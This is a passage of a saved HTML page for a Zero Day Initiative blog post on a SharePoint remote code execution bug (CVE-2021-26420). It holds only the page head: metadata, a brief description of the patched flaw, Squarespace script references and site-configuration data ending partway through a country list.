<!DOCTYPE html>
<!-- saved from url=(0014)about:internet -->
<html xmlns:og="http://opengraphprotocol.org/schema/" xmlns:fb="http://www.facebook.com/2008/fbml" lang="en-US" class="yui3-js-enabled js flexbox canvas canvastext webgl no-touch hashchange history draganddrop rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms no-csstransforms3d csstransitions video audio svg inlinesvg svgclippaths" style="" id="yui_3_17_2_1_1762949703938_102"><div id="yui3-css-stamp" style="position: absolute !important; visibility: hidden !important"></div><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    
    <meta name="viewport" content="width=device-width,initial-scale=1">
    
    <link href="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/css" rel="stylesheet">
    <link href="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/icon" rel="stylesheet">
    <!-- This is Squarespace. --><!-- brian-gorenc -->
<!--<base href="">--><base href=".">

<title>Zero Day Initiative — CVE-2021-26420: Remote Code Execution in SharePoint via Workflow Compilation</title>
<meta http-equiv="Accept-CH" content="Sec-CH-UA-Platform-Version, Sec-CH-UA-Model"><link rel="icon" type="image/x-icon" href="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1487670157237-HOXHMI54TA0SZP21OY7C/favicon.ico">
<link rel="canonical" href="https://www.thezdi.com/blog/2021/10/5/cve-2021-26420-remote-code-execution-in-sharepoint-via-workflow-compilation">
<meta property="og:site_name" content="Zero Day Initiative">
<meta property="og:title" content="Zero Day Initiative — CVE-2021-26420: Remote Code Execution in SharePoint via Workflow Compilation">
<meta property="og:latitude" content="40.7207559">
<meta property="og:longitude" content="-74.0007613">
<meta property="og:locality" content="">
<meta property="og:url" content="https://www.thezdi.com/blog/2021/10/5/cve-2021-26420-remote-code-execution-in-sharepoint-via-workflow-compilation">
<meta property="og:type" content="article">
<meta property="og:description" content="In June of 2021, Microsoft released a patch to correct  CVE-20  21-264  20  – a remote code execution bug in the supported versions of Microsoft SharePoint Server. This bug was reported to the ZDI program by an anonymous researcher and is also known as  ZDI-  21-7  55 . This blog takes a deeper look">
<meta property="og:image" content="http://static1.squarespace.com/static/5894c269e4fcb5e65a1ed623/58a5b38cb3db2bd67b608658/615c9b630ed57035c2afb952/1633537850379/work-wood-construction-repair-hammer-equipment-926209-pxhere.com.jpg?format=1500w">
<meta property="og:image:width" content="1330">
<meta property="og:image:height" content="1080">
<meta itemprop="name" content="Zero Day Initiative — CVE-2021-26420: Remote Code Execution in SharePoint via Workflow Compilation">
<meta itemprop="url" content="https://www.thezdi.com/blog/2021/10/5/cve-2021-26420-remote-code-execution-in-sharepoint-via-workflow-compilation">
<meta itemprop="description" content="In June of 2021, Microsoft released a patch to correct  CVE-20  21-264  20  – a remote code execution bug in the supported versions of Microsoft SharePoint Server. This bug was reported to the ZDI program by an anonymous researcher and is also known as  ZDI-  21-7  55 . This blog takes a deeper look">
<meta itemprop="thumbnailUrl" content="http://static1.squarespace.com/static/5894c269e4fcb5e65a1ed623/58a5b38cb3db2bd67b608658/615c9b630ed57035c2afb952/1633537850379/work-wood-construction-repair-hammer-equipment-926209-pxhere.com.jpg?format=1500w">
<link rel="image_src" href="http://static1.squarespace.com/static/5894c269e4fcb5e65a1ed623/58a5b38cb3db2bd67b608658/615c9b630ed57035c2afb952/1633537850379/work-wood-construction-repair-hammer-equipment-926209-pxhere.com.jpg?format=1500w">
<meta itemprop="image" content="http://static1.squarespace.com/static/5894c269e4fcb5e65a1ed623/58a5b38cb3db2bd67b608658/615c9b630ed57035c2afb952/1633537850379/work-wood-construction-repair-hammer-equipment-926209-pxhere.com.jpg?format=1500w">
<meta itemprop="author" content="The ZDI Research Team">
<meta itemprop="datePublished" content="2021-10-06T11:30:49-0500">
<meta itemprop="dateModified" content="2021-10-06T11:30:50-0500">
<meta itemprop="headline" content="CVE-2021-26420: Remote Code Execution in SharePoint via Workflow Compilation">
<meta itemprop="publisher" content="Zero Day Initiative">
<meta name="twitter:title" content="Zero Day Initiative — CVE-2021-26420: Remote Code Execution in SharePoint via Workflow Compilation">
<meta name="twitter:image" content="http://static1.squarespace.com/static/5894c269e4fcb5e65a1ed623/58a5b38cb3db2bd67b608658/615c9b630ed57035c2afb952/1633537850379/work-wood-construction-repair-hammer-equipment-926209-pxhere.com.jpg?format=1500w">
<meta name="twitter:url" content="https://www.thezdi.com/blog/2021/10/5/cve-2021-26420-remote-code-execution-in-sharepoint-via-workflow-compilation">
<meta name="twitter:card" content="summary">
<meta name="twitter:description" content="In June of 2021, Microsoft released a patch to correct  CVE-20  21-264  20  – a remote code execution bug in the supported versions of Microsoft SharePoint Server. This bug was reported to the ZDI program by an anonymous researcher and is also known as  ZDI-  21-7  55 . This blog takes a deeper look">
<meta name="description" content="">
<link rel="preconnect" href="https://images.squarespace-cdn.com/">
<link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
<link rel="stylesheet" href="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/css2"><script type="text/javascript" async="" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/analytics.js.download"></script><script type="text/javascript" async="" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/js"></script><script type="text/javascript" crossorigin="anonymous" nomodule="nomodule" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/legacy.js.download"></script>
<script type="text/javascript" crossorigin="anonymous" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/modern.js.download"></script>
<script type="text/javascript">SQUARESPACE_ROLLUPS = {};</script>
<script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/extract-css-runtime-d75ad899ad99b3d3-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-extract_css_runtime');</script>
<script crossorigin="anonymous" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/extract-css-runtime-d75ad899ad99b3d3-min.en-US.js.download"></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/extract-css-moment-js-vendor-6f2a1f6ec9a41489-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-extract_css_moment_js_vendor');</script>
<script crossorigin="anonymous" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/extract-css-moment-js-vendor-6f2a1f6ec9a41489-min.en-US.js.download"></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/cldr-resource-pack-22ed584d99d9b83d-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-cldr_resource_pack');</script>
<script crossorigin="anonymous" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/cldr-resource-pack-22ed584d99d9b83d-min.en-US.js.download"></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/common-vendors-stable-fbd854d40b0804b7-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-common_vendors_stable');</script>
<script crossorigin="anonymous" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/common-vendors-stable-fbd854d40b0804b7-min.en-US.js.download"></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/common-vendors-8a7cfb65d43b8de5-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-common_vendors');</script>
<script crossorigin="anonymous" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/common-vendors-8a7cfb65d43b8de5-min.en-US.js.download"></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/common-516d0834eb415d94-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-common');</script>
<script crossorigin="anonymous" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/common-516d0834eb415d94-min.en-US.js.download"></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/user-account-core-c4220b44c6951cc5-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-user_account_core');</script>
<script crossorigin="anonymous" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/user-account-core-c4220b44c6951cc5-min.en-US.js.download"></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].css = ["//assets.squarespace.com/universal/styles-compressed/user-account-core-89dabefb87591b1e-min.en-US.css"]; })(SQUARESPACE_ROLLUPS, 'squarespace-user_account_core');</script>
<link rel="stylesheet" type="text/css" href="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/user-account-core-89dabefb87591b1e-min.en-US.css"><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/performance-45cdefef297be205-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-performance');</script>
<script crossorigin="anonymous" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/performance-45cdefef297be205-min.en-US.js.download" defer=""></script><script data-name="static-context">Static = window.Static || {}; Static.SQUARESPACE_CONTEXT = {"betaFeatureFlags":["campaigns_thumbnail_layout","campaigns_discount_section_in_blasts","i18n_beta_website_locales","marketing_landing_page","campaigns_new_image_layout_picker","campaigns_discount_section_in_automations","campaigns_import_discounts","contacts_and_campaigns_redesign","bfcm_2025_enabled","campaigns_merch_state","order_status_page_checkout_landing_enabled","marketing_automations","enable_form_submission_trigger","use_react_flow_in_automations_flowchart"],"facebookAppId":"314192535267336","facebookApiVersion":"v6.0","rollups":{"squarespace-announcement-bar":{"js":"//assets.squarespace.com/universal/scripts-compressed/announcement-bar-bc29aabcad9b0321-min.en-US.js"},"squarespace-audio-player":{"css":"//assets.squarespace.com/universal/styles-compressed/audio-player-b05f5197a871c566-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/audio-player-e160d216aed116bb-min.en-US.js"},"squarespace-blog-collection-list":{"css":"//assets.squarespace.com/universal/styles-compressed/blog-collection-list-b4046463b72f34e2-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/blog-collection-list-f78db80fc1cd6fce-min.en-US.js"},"squarespace-calendar-block-renderer":{"css":"//assets.squarespace.com/universal/styles-compressed/calendar-block-renderer-b72d08ba4421f5a0-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/calendar-block-renderer-182e89e126289b13-min.en-US.js"},"squarespace-chartjs-helpers":{"css":"//assets.squarespace.com/universal/styles-compressed/chartjs-helpers-96b256171ee039c1-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/chartjs-helpers-4fd57f343946d08e-min.en-US.js"},"squarespace-comments":{"css":"//assets.squarespace.com/universal/styles-compressed/comments-d47e61fe47b5ff82-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/comments-0f751aea9339e89c-min.en-US.js"},"squarespace-custom-css-popup":{"css":"//assets.squarespace.com/universal/styles-compressed/custom-css-popup-89143d073173c3e0-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/custom-css-popup-5177f6aaf8a61cab-min.en-US.js"},"squarespace-dialog":{"css":"//assets.squarespace.com/universal/styles-compressed/dialog-f9093f2d526b94df-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/dialog-5abd3585de282bb5-min.en-US.js"},"squarespace-events-collection":{"css":"//assets.squarespace.com/universal/styles-compressed/events-collection-b72d08ba4421f5a0-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/events-collection-5fa01fd523721c94-min.en-US.js"},"squarespace-form-rendering-utils":{"js":"//assets.squarespace.com/universal/scripts-compressed/form-rendering-utils-dea9bf383ee1a39c-min.en-US.js"},"squarespace-forms":{"css":"//assets.squarespace.com/universal/styles-compressed/forms-0afd3c6ac30bbab1-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/forms-3293f203da904154-min.en-US.js"},"squarespace-gallery-collection-list":{"css":"//assets.squarespace.com/universal/styles-compressed/gallery-collection-list-b4046463b72f34e2-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/gallery-collection-list-07747667a3187b76-min.en-US.js"},"squarespace-image-zoom":{"css":"//assets.squarespace.com/universal/styles-compressed/image-zoom-b4046463b72f34e2-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/image-zoom-60c18dc5f8f599ea-min.en-US.js"},"squarespace-pinterest":{"css":"//assets.squarespace.com/universal/styles-compressed/pinterest-b4046463b72f34e2-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/pinterest-2fa208f4b63c95af-min.en-US.js"},"squarespace-popup-overlay":{"css":"//assets.squarespace.com/universal/styles-compressed/popup-overlay-b742b752f5880972-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/popup-overlay-904ea14ca76293f9-min.en-US.js"},"squarespace-product-quick-view":{"css":"//assets.squarespace.com/universal/styles-compressed/product-quick-view-9052fb446c5800ee-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/product-quick-view-73a41171b1c96185-min.en-US.js"},"squarespace-products-collection-item-v2":{"css":"//assets.squarespace.com/universal/styles-compressed/products-collection-item-v2-b4046463b72f34e2-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/products-collection-item-v2-e3a3f101748fca6e-min.en-US.js"},"squarespace-products-collection-list-v2":{"css":"//assets.squarespace.com/universal/styles-compressed/products-collection-list-v2-b4046463b72f34e2-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/products-collection-list-v2-eedc544f4cc56af4-min.en-US.js"},"squarespace-search-page":{"css":"//assets.squarespace.com/universal/styles-compressed/search-page-90a67fc09b9b32c6-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/search-page-7d8afa9eb5e09a2d-min.en-US.js"},"squarespace-search-preview":{"js":"//assets.squarespace.com/universal/scripts-compressed/search-preview-21194fc3d3addc8e-min.en-US.js"},"squarespace-simple-liking":{"css":"//assets.squarespace.com/universal/styles-compressed/simple-liking-701bf8bbc05ec6aa-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/simple-liking-e6bc64da9e3b1cf4-min.en-US.js"},"squarespace-social-buttons":{"css":"//assets.squarespace.com/universal/styles-compressed/social-buttons-95032e5fa98e47a5-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/social-buttons-81b2f14e6410778c-min.en-US.js"},"squarespace-tourdates":{"css":"//assets.squarespace.com/universal/styles-compressed/tourdates-b4046463b72f34e2-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/tourdates-ebc8e4d29314c4fd-min.en-US.js"},"squarespace-website-overlays-manager":{"css":"//assets.squarespace.com/universal/styles-compressed/website-overlays-manager-07ea5a4e004e6710-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/website-overlays-manager-c044e70cefe65977-min.en-US.js"}},"pageType":50,"website":{"id":"5894c269e4fcb5e65a1ed623","identifier":"brian-gorenc","websiteType":1,"contentModifiedOn":1755108158609,"cloneable":false,"hasBeenCloneable":false,"developerMode":true,"siteStatus":{},"language":"en-US","translationLocale":"en-US","formattingLocale":"en-US","timeZone":"America/Chicago","machineTimeZoneOffset":-21600000,"timeZoneOffset":-21600000,"timeZoneAbbr":"CST","siteTitle":"Zero Day Initiative","fullSiteTitle":"Zero Day Initiative \u2014 CVE-2021-26420: Remote Code Execution in SharePoint via Workflow Compilation","siteDescription":"","location":{},"shareButtonOptions":{"1":true,"4":true,"2":true,"6":true,"3":true},"authenticUrl":"https://www.thezdi.com","internalUrl":"https://brian-gorenc.squarespace.com","baseUrl":"https://www.thezdi.com","primaryDomain":"www.thezdi.com","sslSetting":3,"isHstsEnabled":true,"socialAccounts":[{"serviceId":11,"userId":"UChbH7B5YhXANmlMYJRHpw0g","screenname":"TippingPoint Zero Day Initiative","addedOn":1492722141068,"profileUrl":"https://www.youtube.com/channel/UChbH7B5YhXANmlMYJRHpw0g","iconUrl":"https://yt3.ggpht.com/-5tyoeQlg_Jk/AAAAAAAAAAI/AAAAAAAAAAA/lrjg7w8bQgA/s88-c-k-no-mo-rj-c0xffffff/photo.jpg","iconEnabled":true,"serviceName":"youtube"}],"typekitId":"","statsMigrated":false,"imageMetadataProcessingEnabled":false,"screenshotId":"a0a901f81f08cc6c7c9e5108d43c513fa4847e74de2b39c335909e3f8dd88d34","captchaSettings":{"enabledForDonations":false},"showOwnerLogin":false},"websiteSettings":{"id":"5894c269e4fcb5e65a1ed625","websiteId":"5894c269e4fcb5e65a1ed623","subjects":[],"country":"US","state":"TX","simpleLikingEnabled":true,"mobileInfoBarSettings":{"isContactEmailEnabled":false,"isContactPhoneNumberEnabled":false,"isLocationEnabled":false,"isBusinessHoursEnabled":false},"commentLikesAllowed":true,"commentAnonAllowed":true,"commentThreaded":true,"commentApprovalRequired":false,"commentAvatarsOn":true,"commentSortType":2,"commentFlagThreshold":0,"commentFlagsAllowed":true,"commentEnableByDefault":true,"commentDisableAfterDaysDefault":0,"disqusShortname":"","commentsEnabled":false,"contactPhoneNumber":"","storeSettings":{"returnPolicy":null,"termsOfService":null,"privacyPolicy":null,"expressCheckout":false,"continueShoppingLinkUrl":"/","useLightCart":false,"showNoteField":false,"shippingCountryDefaultValue":"US","billToShippingDefaultValue":false,"showShippingPhoneNumber":true,"isShippingPhoneRequired":false,"showBillingPhoneNumber":true,"isBillingPhoneRequired":false,"currenciesSupported":["CHF","HKD","MXN","EUR","DKK","USD","CAD","MYR","NOK","THB","AUD","SGD","ILS","PLN","GBP","CZK","SEK","NZD","PHP","RUB"],"defaultCurrency":"USD","selectedCurrency":"USD","measurementStandard":1,"showCustomCheckoutForm":false,"checkoutPageMarketingOptInEnabled":false,"enableMailingListOptInByDefault":false,"sameAsRetailLocation":false,"merchandisingSettings":{"scarcityEnabledOnProductItems":false,"scarcityEnabledOnProductBlocks":false,"scarcityMessageType":"DEFAULT_SCARCITY_MESSAGE","scarcityThreshold":10,"multipleQuantityAllowedForServices":true,"restockNotificationsEnabled":false,"restockNotificationsSuccessText":"","restockNotificationsMailingListSignUpEnabled":false,"relatedProductsEnabled":false,"relatedProductsOrdering":"random","soldOutVariantsDropdownDisabled":false,"productComposerOptedIn":false,"productComposerABTestOptedOut":false,"productReviewsEnabled":false,"displayImportedProductReviewsEnabled":false,"hasOptedToCollectNativeReviews":false},"minimumOrderSubtotalEnabled":false,"minimumOrderSubtotal":{"currency":"USD","value":"0.00"},"isLive":false,"multipleQuantityAllowedForServices":true},"useEscapeKeyToLogin":true,"ssBadgeType":1,"ssBadgePosition":4,"ssBadgeVisibility":1,"ssBadgeDevices":1,"pinterestOverlayOptions":{"mode":"disabled"},"userAccountsSettings":{"loginAllowed":false,"signupAllowed":false}},"cookieSettings":{"isCookieBannerEnabled":false,"isRestrictiveCookiePolicyEnabled":false,"cookieBannerText":"","cookieBannerTheme":"","cookieBannerVariant":"","cookieBannerPosition":"","cookieBannerCtaVariant":"","cookieBannerCtaText":"","cookieBannerAcceptType":"OPT_IN","cookieBannerOptOutCtaText":"","cookieBannerHasOptOut":false,"cookieBannerHasManageCookies":true,"cookieBannerManageCookiesLabel":"","cookieBannerSavedPreferencesText":"","cookieBannerSavedPreferencesLayout":"PILL"},"websiteCloneable":false,"collection":{"title":"Blog","id":"58a5b38cb3db2bd67b608658","fullUrl":"/blog","type":1,"permissionType":1},"item":{"title":"CVE-2021-26420: Remote Code Execution in SharePoint via Workflow Compilation","id":"615c9b630ed57035c2afb952","fullUrl":"/blog/2021/10/5/cve-2021-26420-remote-code-execution-in-sharepoint-via-workflow-compilation","publicCommentCount":0,"commentState":2,"recordType":1},"subscribed":false,"appDomain":"squarespace.com","templateTweakable":true,"tweakJSON":{"aspect-ratio":"Auto","bg-image":"{background-image:url(\"https://static1.squarespace.com/static/56cb6c0001dbae33a8227531/t/56ccdc64cf80a1db151ed7dd/1456266340825/cocktail-bw.jpg\");background-position:center center;background-size:cover;background-attachment:scroll;background-repeat:no-repeat}","gallery-arrow-style":"No Background","gallery-aspect-ratio":"3:2 Standard","gallery-auto-crop":"true","gallery-autoplay":"false","gallery-design":"Slideshow","gallery-info-overlay":"Show on Hover","gallery-loop":"false","gallery-navigation":"Bullets","gallery-show-arrows":"true","gallery-transitions":"Fade","galleryArrowBackground":"rgba(34,34,34,1)","galleryArrowColor":"rgba(255,255,255,1)","galleryAutoplaySpeed":"3","galleryCircleColor":"rgba(255,255,255,1)","galleryInfoBackground":"rgba(0, 0, 0, .7)","galleryThumbnailSize":"100px","gridSize":"350px","gridSpacing":"20px","product-gallery-auto-crop":"true","product-image-auto-crop":"true","tweak-v1-related-products-title-spacing":"50px"},"templateId":"67aa61355065f439ea56543f","templateVersion":"7","pageFeatures":[1,2,4],"gmRenderKey":"QUl6YVN5Q0JUUk9xNkx1dkZfSUUxcjQ2LVQ0QWVUU1YtMGQ3bXk4","templateScriptsRootUrl":"https://static1.squarespace.com/static/ta/5894c269e4fcb5e65a1ed623/33/scripts/","impersonatedSession":false,"tzData":{"zones":[[-360,"US","C%sT",null]],"rules":{"US":[[1967,2006,null,"Oct","lastSun","2:00","0","S"],[1987,2006,null,"Apr","Sun>=1","2:00","1:00","D"],[2007,"max",null,"Mar","Sun>=8","2:00","1:00","D"],[2007,"max",null,"Nov","Sun>=1","2:00","0","S"]]}},"showAnnouncementBar":false,"recaptchaEnterpriseContext":{"recaptchaEnterpriseSiteKey":"6LdDFQwjAAAAAPigEvvPgEVbb7QBm-TkVJdDTlAv"},"i18nContext":{"timeZoneData":{"id":"America/Chicago","name":"Central Time"}},"env":"PRODUCTION","visitorFormContext":{"formFieldFormats":{"initialPhoneFormat":{"id":0,"type":"PHONE_NUMBER","country":"US","labelLocale":"en-US","fields":[{"type":"SEPARATOR","label":"(","identifier":"LeftParen","length":0,"required":false,"metadata":{}},{"type":"FIELD","label":"1","identifier":"1","length":3,"required":false,"metadata":{}},{"type":"SEPARATOR","label":")","identifier":"RightParen","length":0,"required":false,"metadata":{}},{"type":"SEPARATOR","label":" ","identifier":"Space","length":0,"required":false,"metadata":{}},{"type":"FIELD","label":"2","identifier":"2","length":3,"required":false,"metadata":{}},{"type":"SEPARATOR","label":"-","identifier":"Dash","length":0,"required":false,"metadata":{}},{"type":"FIELD","label":"3","identifier":"3","length":14,"required":false,"metadata":{}}]},"initialNameOrder":"GIVEN_FIRST","initialAddressFormat":{"id":0,"type":"ADDRESS","country":"US","labelLocale":"en","fields":[{"type":"FIELD","label":"Address Line 1","identifier":"Line1","length":0,"required":true,"metadata":{"autocomplete":"address-line1"}},{"type":"SEPARATOR","label":"\n","identifier":"Newline","length":0,"required":false,"metadata":{}},{"type":"FIELD","label":"Address Line 2","identifier":"Line2","length":0,"required":false,"metadata":{"autocomplete":"address-line2"}},{"type":"SEPARATOR","label":"\n","identifier":"Newline","length":0,"required":false,"metadata":{}},{"type":"FIELD","label":"City","identifier":"City","length":0,"required":true,"metadata":{"autocomplete":"address-level2"}},{"type":"SEPARATOR","label":",","identifier":"Comma","length":0,"required":false,"metadata":{}},{"type":"SEPARATOR","label":" ","identifier":"Space","length":0,"required":false,"metadata":{}},{"type":"FIELD","label":"State","identifier":"State","length":0,"required":true,"metadata":{"autocomplete":"address-level1"}},{"type":"SEPARATOR","label":" ","identifier":"Space","length":0,"required":false,"metadata":{}},{"type":"FIELD","label":"ZIP Code","identifier":"Zip","length":0,"required":true,"metadata":{"autocomplete":"postal-code"}}]},"countries":[{"name":"Afghanistan","code":"AF","phoneCode":"+93"},{"name":"\u00C5land Islands","code":"AX","phoneCode":"+358"},{"name":"Albania","code":"AL","phoneCode":"+355"},{"name":"Algeria","code":"DZ","phoneCode":"+213"},{"name":"American Samoa","code":"AS","phoneCode":"+1"},{"name":"Andorra","code":"AD","phoneCode":"+376"},{"name":"Angola","code":"AO","phoneCode":"+244"},{"name":"Anguilla","code":"AI","phoneCode":"+1"},{"name":"Antigua & Barbuda","code":"AG","phoneCode":"+1"},{"name":"Argentina","code":"AR","phoneCode":"+54"},{"name":"Armenia","code":"AM","phoneCode":"+374"},{"name":"Aruba","code":"AW","phoneCode":"+297"},{"name":"Ascension Island","code":"AC","phoneCode":"+247"},{"name":"Australia","code":"AU","phoneCode":"+61"},{"name":"Austria","code":"AT","phoneCode":"+43"},{"name":"Azerbaijan","code":"AZ","phoneCode":"+994"},{"name":"Bahamas","code":"BS","phoneCode":"+1"},{"name":"Bahrain","code":"BH","phoneCode":"+973"},{"name":"Bangladesh","code":"BD","phoneCode":"+880"},{"name":"Barbados","code":"BB","phoneCode":"+1"},{"name":"Belarus","code":"BY","phoneCode":"+375"},{"name":"Belgium","code":"BE","phoneCode":"+32"},{"name":"Belize","code":"BZ","phoneCode":"+501"},{"name":"Benin","code":"BJ","phoneCode":"+229"},{"name":"Bermuda","code":"BM","phoneCode":"+1"},{"name":"Bhutan","code":"BT","phoneCode":"+975"},{"name":"Bolivia","code":"BO","phoneCode":"+591"},{"name":"Bosnia & Herzegovina","code":"BA","phoneCode":"+387"},{"name":"Botswana","code":"BW","phoneCode":"+267"},{"name":"Brazil","code":"BR","phoneCode":"+55"},{"name":"British Indian Ocean Territory","code":"IO","phoneCode":"+246"},{"name":"British Virgin Islands","code":"VG","phoneCode":"+1"},{"name":"Brunei","code":"BN","phoneCode":"+673"},{"name":"Bulgaria","code":"BG","phoneCode":"+359"},{"name":"Burkina Faso","code":"BF","phoneCode":"+226"},{"name":"Burundi","code":"BI","phoneCode":"+257"},{"name":"Cambodia","code":"KH","phoneCode":"+855"},{"name":"Cameroon","code":"CM","phoneCode":"+237"},{"name":"Canada","code":"CA","phoneCode":"+1"},{"name":"Cape Verde","code":"CV","phoneCode":"+238"},{"name":"Caribbean Netherlands","code":"BQ","phoneCode":"+599"},{"name":"Cayman Islands","code":"KY","phoneCode":"+1"},{"name":"Central African Republic","code":"CF","phoneCode":"+236"},{"name":"Chad","code":"TD","phoneCode":"+235"},{"name":"Chile","code":"CL","phoneCode":"+56"},{"name":"China","code":"CN","phoneCode":"+86"},{"name":"Christmas Island","code":"CX","phoneCode":"+61"},{"name":"Cocos (Keeling) Islands","code":"CC","phoneCode":"+61"},{"name":"Colombia","code":"CO","phoneCode":"+57"},{"name":"Comoros","code":"KM","phoneCode":"+269"},{"name":"Congo - Brazzaville","code":"CG","phoneCode":"+242"},{"name":"Congo - Kinshasa","code":"CD","phoneCode":"+243"},{"name":"Cook Islands","code":"CK","phoneCode":"+682"},{"name":"Costa Rica","code":"CR","phoneCode":"+506"},{"name":"C\u00F4te d\u2019Ivoire","code":"CI","phoneCode":"+225"},{"name":"Croatia","code":"HR","phoneCode":"+385"},{"name":"Cuba","code":"CU","phoneCode":"+53"},{"name":"Cura\u00E7ao","code":"CW","phoneCode":"+599"},{"name":"Cyprus","code":"CY","phoneCode":"+357"},{"name":"Czechia","code":"CZ","phoneCode":"+420"},{"name":"Denmark","code":"DK","phoneCode":"+45"},{"name":"Djibouti","code":"DJ","phoneCode":"+253"},{"name":"Dominica","code":"DM","phoneCode":"+1"},{"name":"Dominican Republic","code":"DO","phoneCode":"+1"},{"name":"Ecuador","code":"EC","phoneCode":"+593"},{"name":"Egypt","code":"EG","phoneCode":"+20"},{"name":"El Salvador","code":"SV","phoneCode":"+503"},{"name":"Equatorial Guinea","code":"GQ","phoneCode":"+240"},{"name":"Eritrea","code":"ER","phoneCode":"+291"},{"name":"Estonia","code":"EE","phoneCode":"+372"},{"name":"Eswatini","code":"SZ","phoneCode":"+268"},{"name":"Ethiopia","code":"ET","phoneCode":"+251"},{"name":"Falkland Islands","code":"FK","phoneCode":"+500"},{"name":"Faroe Islands","code":"FO","phoneCode":"+298"},{"name":"Fiji","code":"FJ","phoneCode":"+679"},{"name":"Finland","code":"FI","phoneCode":"+358"},{"name":"France","code":"FR","phoneCode":"+33"},{"name":"French Guiana","code":"GF","phoneCode":"+594"},{"name":"French 